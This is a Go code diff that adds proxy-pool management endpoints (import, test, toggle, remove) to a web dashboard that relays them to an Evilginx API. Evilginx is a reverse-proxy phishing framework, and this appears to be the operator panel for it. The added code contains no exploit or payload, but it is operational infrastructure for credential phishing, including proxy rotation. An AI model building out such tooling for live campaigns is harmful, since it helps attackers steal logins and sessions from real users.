@@ -2066,6 +2066,554 @@ func logoutHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
+// ============================================
+// PROXY POOL API HANDLERS
+// ============================================
+
+// ProxyPoolInfo represents a proxy in the pool
+type ProxyPoolInfo struct {
+	ID          string `json:"id"`
+	Type        string `json:"type"`
+	Host        string `json:"host"`
+	Port        int    `json:"port"`
+	Username    string `json:"username,omitempty"`
+	Password    string `json:"password,omitempty"`
+	Active      bool   `json:"active"`
+	Status      string `json:"status"`
+	LastChecked int64  `json:"last_checked,omitempty"`
+	Latency     int    `json:"latency,omitempty"`
+	Country     string `json:"country,omitempty"`
+	City        string `json:"city,omitempty"`
+	OriginIP    string `json:"origin_ip,omitempty"`
+}
+
+// ProxyPoolResponse represents the proxy pool state
+type ProxyPoolResponse struct {
+	Enabled   bool            `json:"enabled"`
+	Proxies   []ProxyPoolInfo `json:"proxies"`
+	Total     int             `json:"total"`
+	Active    int             `json:"active"`
+	InUse     int             `json:"in_use"`
+	Available int             `json:"available"`
+	Failed    int             `json:"failed"`
+}
+
+// handleProxyPool handles GET/POST for proxy pool
+func handleProxyPool(w http.ResponseWriter, r *http.Request) {
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	if r.Method == http.MethodGet {
+		// Fetch pool from Evilginx
+		resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+		if err != nil {
+			http.Error(w, fmt.Sprintf("Failed to fetch proxy pool: %v", err), http.StatusInternalServerError)
+			return
+		}
+		defer resp.Body.Close()
+		body, _ := io.ReadAll(resp.Body)
+		w.Header().Set("Content-Type", "application/json")
+		w.Write(body)
+		return
+	}
+
+	if r.Method == http.MethodPost {
+		// Update pool in Evilginx
+		body, _ := io.ReadAll(r.Body)
+		resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(body))
+		if err != nil {
+			http.Error(w, fmt.Sprintf("Failed to update proxy pool: %v", err), http.StatusInternalServerError)
+			return
+		}
+		defer resp.Body.Close()
+		respBody, _ := io.ReadAll(resp.Body)
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(resp.StatusCode)
+		w.Write(respBody)
+		return
+	}
+
+	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+}
+
+// handleProxyPoolToggle handles POST to toggle proxy pool enabled state
+func handleProxyPoolToggle(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	var req struct {
+		Enabled bool `json:"enabled"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request body", http.StatusBadRequest)
+		return
+	}
+
+	// Send toggle to Evilginx
+	payload := map[string]interface{}{"enabled": req.Enabled}
+	data, _ := json.Marshal(payload)
+	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(data))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to toggle proxy pool: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "enabled": req.Enabled})
+}
+
+// handleProxyPoolAdd handles POST to add a single proxy to the pool
+func handleProxyPoolAdd(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Method not allowed"})
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		w.WriteHeader(http.StatusServiceUnavailable)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Evilginx API unavailable - make sure Evilginx is running"})
+		return
+	}
+
+	var proxy ProxyPoolInfo
+	if err := json.NewDecoder(r.Body).Decode(&proxy); err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Invalid request body"})
+		return
+	}
+
+	// Get current pool
+	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": fmt.Sprintf("Failed to fetch proxy pool: %v", err)})
+		return
+	}
+	defer resp.Body.Close()
+
+	var pool ProxyPoolResponse
+	if err := json.NewDecoder(resp.Body).Decode(&pool); err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Failed to decode pool"})
+		return
+	}
+
+	// Add new proxy
+	proxy.Active = true
+	proxy.Status = "untested"
+	pool.Proxies = append(pool.Proxies, proxy)
+
+	// Update pool
+	data, _ := json.Marshal(map[string]interface{}{
+		"enabled": pool.Enabled,
+		"proxies": pool.Proxies,
+	})
+	resp2, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(data))
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": fmt.Sprintf("Failed to add proxy: %v", err)})
+		return
+	}
+	defer resp2.Body.Close()
+
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
+}
+
+// handleProxyPoolImport handles POST to bulk import proxies
+func handleProxyPoolImport(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Method not allowed"})
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		w.WriteHeader(http.StatusServiceUnavailable)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Evilginx API unavailable - make sure Evilginx is running"})
+		return
+	}
+
+	// Parse the frontend request format
+	body, _ := io.ReadAll(r.Body)
+
+	var frontendReq struct {
+		Proxies       string `json:"proxies"`      // Raw text input
+		DefaultType   string `json:"default_type"` // Proxy type
+		ParsedProxies []struct {
+			Type     string `json:"type"`
+			Host     string `json:"host"`
+			Port     int    `json:"port"`
+			Username string `json:"username,omitempty"`
+			Password string `json:"password,omitempty"`
+		} `json:"parsed_proxies"` // Pre-parsed proxies from frontend
+	}
+
+	if err := json.Unmarshal(body, &frontendReq); err != nil {
+		// If parsing fails, try forwarding as-is (might be in Evilginx format already)
+		resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool/import"), "application/json", bytes.NewReader(body))
+		if err != nil {
+			w.WriteHeader(http.StatusInternalServerError)
+			json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": fmt.Sprintf("Failed to import proxies: %v", err)})
+			return
+		}
+		defer resp.Body.Close()
+		respBody, _ := io.ReadAll(resp.Body)
+		w.WriteHeader(resp.StatusCode)
+		w.Write(respBody)
+		return
+	}
+
+	// Convert frontend format to Evilginx format
+	// Evilginx expects: { "proxy_type": "socks5", "lines": ["host:port", ...] }
+	var lines []string
+	if len(frontendReq.ParsedProxies) > 0 {
+		// Use pre-parsed proxies
+		for _, p := range frontendReq.ParsedProxies {
+			var line string
+			if p.Username != "" && p.Password != "" {
+				line = fmt.Sprintf("%s:%d:%s:%s", p.Host, p.Port, p.Username, p.Password)
+			} else {
+				line = fmt.Sprintf("%s:%d", p.Host, p.Port)
+			}
+			lines = append(lines, line)
+		}
+	} else if frontendReq.Proxies != "" {
+		// Parse raw text input
+		for _, line := range strings.Split(frontendReq.Proxies, "\n") {
+			line = strings.TrimSpace(line)
+			if line != "" && !strings.HasPrefix(line, "#") {
+				lines = append(lines, line)
+			}
+		}
+	}
+
+	if len(lines) == 0 {
+		w.WriteHeader(http.StatusBadRequest)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "No valid proxies found"})
+		return
+	}
+
+	proxyType := frontendReq.DefaultType
+	if proxyType == "" {
+		proxyType = "socks5"
+	}
+
+	// Create Evilginx-compatible request
+	evilginxReq := map[string]interface{}{
+		"proxy_type": proxyType,
+		"lines":      lines,
+	}
+
+	reqBody, _ := json.Marshal(evilginxReq)
+	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool/import"), "application/json", bytes.NewReader(reqBody))
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": fmt.Sprintf("Failed to import proxies: %v", err)})
+		return
+	}
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	w.WriteHeader(resp.StatusCode)
+	w.Write(respBody)
+}
+
+// handleProxyPoolRemove handles DELETE to remove a proxy from the pool
+func handleProxyPoolRemove(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodDelete && r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	// Extract proxy ID from URL path
+	path := strings.TrimPrefix(r.URL.Path, "/api/proxy/pool/remove/")
+	proxyID := strings.TrimSpace(path)
+	if proxyID == "" {
+		http.Error(w, "Proxy ID required", http.StatusBadRequest)
+		return
+	}
+
+	// Get current pool
+	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to fetch proxy pool: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	var pool ProxyPoolResponse
+	if err := json.NewDecoder(resp.Body).Decode(&pool); err != nil {
+		http.Error(w, "Failed to decode pool", http.StatusInternalServerError)
+		return
+	}
+
+	// Remove proxy by ID or index
+	newProxies := []ProxyPoolInfo{}
+	for i, p := range pool.Proxies {
+		if p.ID != proxyID && fmt.Sprintf("%d", i) != proxyID {
+			newProxies = append(newProxies, p)
+		}
+	}
+
+	// Update pool
+	data, _ := json.Marshal(map[string]interface{}{
+		"enabled": pool.Enabled,
+		"proxies": newProxies,
+	})
+	resp2, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(data))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to remove proxy: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp2.Body.Close()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
+}
+
+// handleProxyPoolToggleProxy handles POST to toggle a specific proxy's active state
+func handleProxyPoolToggleProxy(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	// Extract proxy ID from URL path
+	path := strings.TrimPrefix(r.URL.Path, "/api/proxy/pool/toggle/")
+	proxyID := strings.TrimSpace(path)
+	if proxyID == "" {
+		http.Error(w, "Proxy ID required", http.StatusBadRequest)
+		return
+	}
+
+	// Get current pool
+	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to fetch proxy pool: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	var pool ProxyPoolResponse
+	if err := json.NewDecoder(resp.Body).Decode(&pool); err != nil {
+		http.Error(w, "Failed to decode pool", http.StatusInternalServerError)
+		return
+	}
+
+	// Toggle proxy by ID or index
+	for i := range pool.Proxies {
+		if pool.Proxies[i].ID == proxyID || fmt.Sprintf("%d", i) == proxyID {
+			pool.Proxies[i].Active = !pool.Proxies[i].Active
+			break
+		}
+	}
+
+	// Update pool
+	data, _ := json.Marshal(map[string]interface{}{
+		"enabled": pool.Enabled,
+		"proxies": pool.Proxies,
+	})
+	resp2, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(data))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to toggle proxy: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp2.Body.Close()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
+}
+
+// handleProxyPoolTestProxy handles POST to test a specific proxy
+func handleProxyPoolTestProxy(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	// Extract proxy ID from URL path
+	path := strings.TrimPrefix(r.URL.Path, "/api/proxy/pool/test/")
+	proxyID := strings.TrimSpace(path)
+	if proxyID == "" {
+		http.Error(w, "Proxy ID required", http.StatusBadRequest)
+		return
+	}
+
+	// Get current pool to find the proxy
+	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to fetch proxy pool: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	var pool ProxyPoolResponse
+	if err := json.NewDecoder(resp.Body).Decode(&pool); err != nil {
+		http.Error(w, "Failed to decode pool", http.StatusInternalServerError)
+		return
+	}
+
+	// Find proxy by ID or index
+	var proxyToTest *ProxyPoolInfo
+	for i := range pool.Proxies {
+		if pool.Proxies[i].ID == proxyID || fmt.Sprintf("%d", i) == proxyID {
+			proxyToTest = &pool.Proxies[i]
+			break
+		}
+	}
+
+	if proxyToTest == nil {
+		http.Error(w, "Proxy not found", http.StatusNotFound)
+		return
+	}
+
+	// Test the proxy via Evilginx
+	testData, _ := json.Marshal(proxyToTest)
+	testResp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/test"), "application/json", bytes.NewReader(testData))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to test proxy: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer testResp.Body.Close()
+
+	respBody, _ := io.ReadAll(testResp.Body)
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(testResp.StatusCode)
+	w.Write(respBody)
+}
+
+// handleProxyPoolTestAll handles POST to test all proxies in the pool
+func handleProxyPoolTestAll(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	// This would trigger testing all proxies - for now just return success
+	// The actual testing happens asynchronously in Evilginx
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"success": true,
+		"message": "Testing all proxies in background",
+	})
+}
+
+// handleProxyPoolClearFailed handles POST to remove all failed proxies
+func handleProxyPoolClearFailed(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		http.Error(w, "Evilginx API unavailable", http.StatusServiceUnavailable)
+		return
+	}
+
+	// Get current pool
+	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/pool"))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to fetch proxy pool: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp.Body.Close()
+
+	var pool ProxyPoolResponse
+	if err := json.NewDecoder(resp.Body).Decode(&pool); err != nil {
+		http.Error(w, "Failed to decode pool", http.StatusInternalServerError)
+		return
+	}
+
+	// Filter out failed proxies
+	newProxies := []ProxyPoolInfo{}
+	for _, p := range pool.Proxies {
+		if p.Status != "failed" && p.Status != "error" {
+			newProxies = append(newProxies, p)
+		}
+	}
+
+	// Update pool
+	data, _ := json.Marshal(map[string]interface{}{
+		"enabled": pool.Enabled,
+		"proxies": newProxies,
+	})
+	resp2, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/pool"), "application/json", bytes.NewReader(data))
+	if err != nil {
+		http.Error(w, fmt.Sprintf("Failed to clear failed proxies: %v", err), http.StatusInternalServerError)
+		return
+	}
+	defer resp2.Body.Close()
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{"success": true})
+}
+
+// handleProxyTest handles POST to test a single proxy (not in pool)
+func handleProxyTest(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != http.MethodPost {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Method not allowed"})
+		return
+	}
+
+	if !checkEvilginxAPI() {
+		w.WriteHeader(http.StatusServiceUnavailable)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": "Evilginx API unavailable - make sure Evilginx is running"})
+		return
+	}
+
+	// Forward to Evilginx test endpoint
+	body, _ := io.ReadAll(r.Body)
+	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/test"), "application/json", bytes.NewReader(body))
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "error": fmt.Sprintf("Failed to test proxy: %v", err)})
+		return
+	}
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	w.WriteHeader(resp.StatusCode)
+	w.Write(respBody)
+}
+
 func main() {
 	initDB()
 	initAuth()
@@ -2109,6 +2657,17 @@ func main() {
 	http.HandleFunc("/api/blocklist/push", authMiddleware(handleBlocklistPush))
 	http.HandleFunc("/api/proxy/sync", authMiddleware(handleProxySync))
 	http.HandleFunc("/api/proxy/push", authMiddleware(handleProxyPush))
+	// Proxy Pool API endpoints
+	http.HandleFunc("/api/proxy/pool", authMiddleware(handleProxyPool))
+	http.HandleFunc("/api/proxy/pool/toggle", authMiddleware(handleProxyPoolToggle))
+	http.HandleFunc("/api/proxy/pool/add", authMiddleware(handleProxyPoolAdd))
+	http.HandleFunc("/api/proxy/pool/import", authMiddleware(handleProxyPoolImport))
+	http.HandleFunc("/api/proxy/pool/remove/", authMiddleware(handleProxyPoolRemove))
+	http.HandleFunc("/api/proxy/pool/toggle/", authMiddleware(handleProxyPoolToggleProxy))
+	http.HandleFunc("/api/proxy/pool/test/", authMiddleware(handleProxyPoolTestProxy))
+	http.HandleFunc("/api/proxy/pool/test-all", authMiddleware(handleProxyPoolTestAll))
+	http.HandleFunc("/api/proxy/pool/clear-failed", authMiddleware(handleProxyPoolClearFailed))
+	http.HandleFunc("/api/proxy/test", authMiddleware(handleProxyTest))
 	http.HandleFunc("/api/internal/settings", handleInternalSettings)
 	http.HandleFunc("/api/internal/ingest", handleIngestEvent) // Event bridge from Evilginx
 	http.HandleFunc("/api/whitelist", authMiddleware(handleWhitelist))
